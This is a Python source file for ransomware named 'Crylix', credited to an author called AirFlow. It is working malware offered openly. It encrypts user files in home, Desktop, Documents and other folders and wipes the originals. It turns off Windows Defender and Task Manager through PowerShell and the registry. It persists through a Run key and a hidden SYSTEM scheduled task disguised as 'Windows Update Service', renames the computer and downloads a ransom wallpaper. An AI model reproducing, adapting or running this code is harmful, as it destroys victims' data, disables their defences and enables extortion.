# Crylix Ransomware
# Author: AirFlow
# Contact: https://airflowd.netlify.app/

import os
import urllib.request
import platform
import sys
import winreg
import ctypes
import subprocess
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes, padding, hmac
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
import hashlib

class CryptoEngine:
    def __init__(self, master_seed):
        self.master_seed = master_seed
        self.backend = default_backend()
        self.encrypted_count = 0
        self.failed_count = 0
        
    def _chaotic_keygen(self, length=64):
        key = bytearray()
        x = self.master_seed
        for _ in range(length):
            x = 3.999 * x * (1 - x)
            key.append(int(x * 256) % 256)
        return bytes(key)
    
    def _derive_key(self, salt):
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA3_512(),
            length=64,
            salt=salt,
            iterations=100000,
            backend=self.backend
        )
        return kdf.derive(self._chaotic_keygen())
    
    def encrypt_file(self, file_path):
        try:
            skip_dirs = ['windows', 'program files', 'appdata', 'temp', 'system32']
            if any(skip_dir in file_path.lower() for skip_dir in skip_dirs):
                return False
                
            if file_path.endswith('.airf'):
                return False

            if os.path.getsize(file_path) > 50 * 1024 * 1024:
                print(f"[!] Skipping large file: {file_path}")
                return False

            print(f"[*] Encrypting: {file_path}")
            
            salt = os.urandom(32)
            iv = os.urandom(16)
            
            master_key = self._derive_key(salt)
            enc_key = master_key[:32]
            auth_key = master_key[32:]

            file_hash = hashlib.blake2b(file_path.encode()).digest()
            
            cipher = Cipher(
                algorithms.AES(enc_key),
                modes.OFB(iv),
                backend=self.backend
            )
            encryptor = cipher.encryptor()
            padder = padding.PKCS7(128).padder()

            temp_path = f"{file_path}.tmp"
            with open(file_path, 'rb') as infile, open(temp_path, 'wb') as outfile:
                outfile.write(salt)
                outfile.write(iv)
                outfile.write(file_hash)
                
                chunk_size = 8192
                while chunk := infile.read(chunk_size):
                    padded = padder.update(chunk)
                    encrypted = encryptor.update(padded)
                    
                    h = hmac.HMAC(auth_key, hashes.SHA256(), backend=self.backend)
                    h.update(encrypted)
                    chunk_tag = h.finalize()
                    
                    outfile.write(encrypted)
                    outfile.write(chunk_tag)
                
                final = padder.finalize()
                encrypted_final = encryptor.update(final) + encryptor.finalize()
                outfile.write(encrypted_final)

            encrypted_path = f"{file_path}.airf"
            os.replace(temp_path, encrypted_path)
            self._secure_wipe(file_path)
            
            self.encrypted_count += 1
            return True
            
        except PermissionError:
            print(f"[!] Permission denied: {file_path}")
            self.failed_count += 1
            return False
        except Exception as e:
            print(f"[!] Encryption failed for {file_path}: {str(e)}")
            self.failed_count += 1
            if os.path.exists(temp_path):
                try:
                    os.remove(temp_path)
                except:
                    pass
            return False

    def _secure_wipe(self, file_path, passes=3):
        try:
            if not os.path.exists(file_path):
                return
                
            with open(file_path, 'ba+') as f:
                length = f.tell()
                for _ in range(passes):
                    f.seek(0)
                    f.write(os.urandom(length))
                f.truncate()
            os.remove(file_path)
        except Exception as e:
            print(f"[!] Secure wipe failed for {file_path}: {str(e)}")
            try:
                os.remove(file_path)
            except:
                pass

def disable_protections():
    try:
        print("[+] Disabling security measures...")
        script_path = os.path.abspath(sys.argv[0])
        ps_commands = [
            'Set-MpPreference -DisableRealtimeMonitoring $true',
            'Set-MpPreference -DisableIntrusionPreventionSystem $true',
            'Set-MpPreference -DisableScriptScanning $true',
            'Set-MpPreference -DisableIOAVProtection $true',
            'Stop-Service -Name WinDefend -Force'
        ]
        for cmd in ps_commands:
            result = subprocess.run(['powershell', '-Command', cmd], capture_output=True, shell=True)
            if result.returncode != 0:
                print(f"[!] Command failed: {cmd}")
        
        print("[+] Disabling Task Manager...")
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
                winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        except Exception as e:
            print(f"[!] Task Manager disable failed: {e}")
            
    except Exception as e:
        print(f"[!] Protection disable failed: {e}")

def set_wallpaper(img_url):
    try:
        print("[+] Setting wallpaper...")
        path = os.path.join(os.environ['TEMP'], 'wallpaper.png')
        urllib.request.urlretrieve(img_url, path)
        if platform.system() == "Windows":
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
        print("[+] Wallpaper set successfully")
    except Exception as e:
        print(f"[!] Wallpaper set failed: {e}")

def change_computer_name():
    try:
        print("[+] Preparing to change computer name after reboot...")
        new_name = "Cant hide from Crylix"
        
        try:
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName",
                0, winreg.KEY_WRITE
            )
            winreg.SetValueEx(key, "ComputerName", 0, winreg.REG_SZ, new_name)
            winreg.CloseKey(key)
            
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                0, winreg.KEY_WRITE
            )
            winreg.SetValueEx(key, "NV Hostname", 0, winreg.REG_SZ, new_name)
            winreg.SetValueEx(key, "Hostname", 0, winreg.REG_SZ, new_name)
            winreg.CloseKey(key)
            print("[+] Computer name change scheduled for next reboot")
        except Exception as e:
            print(f"[!] Registry method failed: {e}")
        
        try:
            subprocess.run(
                ['wmic', 'computersystem', 'where', 'name="%computername%"', 
                 'call', 'rename', f'"{new_name}"'],
                check=True,
                capture_output=True
            )
            print("[+] Computer name changed immediately")
        except subprocess.CalledProcessError as e:
            print(f"[!] WMI rename failed (may need admin): {e.stderr.decode()}")
            
    except Exception as e:
        print(f"[!] Computer name change failed: {e}")

def establish_persistence():
    try:
        print("[+] Establishing persistence...")
        
        script_path = os.path.abspath(sys.argv[0])
        exe_path = script_path.replace('.py', '.exe') if script_path.endswith('.py') else script_path

        try:
            with winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_WRITE
            ) as key:
                winreg.SetValueEx(
                    key,
                    "WindowsUpdateService",
                    0,
                    winreg.REG_SZ,
                    f'"{exe_path}" /silent'
                )
            print("[+] Registry persistence established")
        except Exception as e:
            print(f"[!] Registry Run failed: {e}")

        try:
            task_xml = f'''
            <Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
              <RegistrationInfo>
                <Description>Windows Update Service</Description>
              </RegistrationInfo>
              <Triggers>
                <LogonTrigger>
                  <Enabled>true</Enabled>
                </LogonTrigger>
              </Triggers>
              <Principals>
                <Principal id="Author">
                  <UserId>S-1-5-18</UserId>
                  <RunLevel>HighestAvailable</RunLevel>
                </Principal>
              </Principals>
              <Settings>
                <Hidden>true</Hidden>
              </Settings>
              <Actions Context="Author">
                <Exec>
                  <Command>"{exe_path}"</Command>
                  <Arguments>/background</Arguments>
                </Exec>
              </Actions>
            </Task>
            '''
            
            xml_path = os.path.join(os.environ['TEMP'], 'task.xml')
            with open(xml_path, 'w') as f:
                f.write(task_xml)
                
            result = subprocess.run([
                'schtasks.exe',
                '/Create',
                '/TN', r'\Microsoft\Windows\Update\Service',
                '/XML', xml_path,
                '/F'
            ], capture_output=True)
            
            if result.returncode == 0:
                print("[+] Scheduled task created")
            else:
                print(f"[!] Task creation failed: {result.stderr.decode()}")
                
            try:
                os.remove(xml_path)
            except:
                pass
                
        except Exception as e:
            print(f"[!] Scheduled Task failed: {e}")

    except Exception as e:
        print(f"[!] Persistence setup failed: {e}")

def scan_and_encrypt(cryptor, path):
    try:
        for root, dirs, files in os.walk(path):
            for file in files:
                file_path = os.path.join(root, file)
                cryptor.encrypt_file(file_path)
    except Exception as e:
        print(f"[!] Error scanning {path}: {e}")

def main():
    try:
        print("[=== Main encryption ===]")
        
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            is_admin = False
            
        if not is_admin:
            print("[!] Warning: Running without administrator privileges")
        
        establish_persistence()
        disable_protections()
        set_wallpaper("https://i.postimg.cc/tTY5tH5v/Screenshot-2025-07-28-181037.png")
        change_computer_name()
        
        print("[+] Starting encryption process...")
        cryptor = CryptoEngine(0.3141592653589793)
        
        targets = [
            os.path.expanduser("~"),  
            "C:\\Test",               
            os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/Documents"),
            os.path.expanduser("~/Pictures"),
            os.path.expanduser("~/Downloads"),
            os.path.expanduser("~/Music"),
            os.path.expanduser("~/Videos")
        ]
        
        targets = [t for t in targets if os.path.exists(t)]
        
        if not targets:
            print("[!] No valid target directories found!")
            return
            
        print(f"[*] Targeting these locations: {targets}")
        
        for target in targets:
            print(f"[*] Processing: {target}")
            scan_and_encrypt(cryptor, target)
        
        print(f"[+] Encryption complete! Total files encrypted: {cryptor.encrypted_count}, Failed: {cryptor.failed_count}")

    except KeyboardInterrupt:
        print("\n[!] Operation cancelled by user")
    except Exception as e:
        print(f"[!] Main execution failed: {e}")

if __name__ == "__main__":
    try:
        if platform.system() == "Windows":
            ctypes.windll.kernel32.SetConsoleTitleW("Windows Update Service")
        main()
    except Exception as e:
        print(f"[!] Script failed to start: {e}")
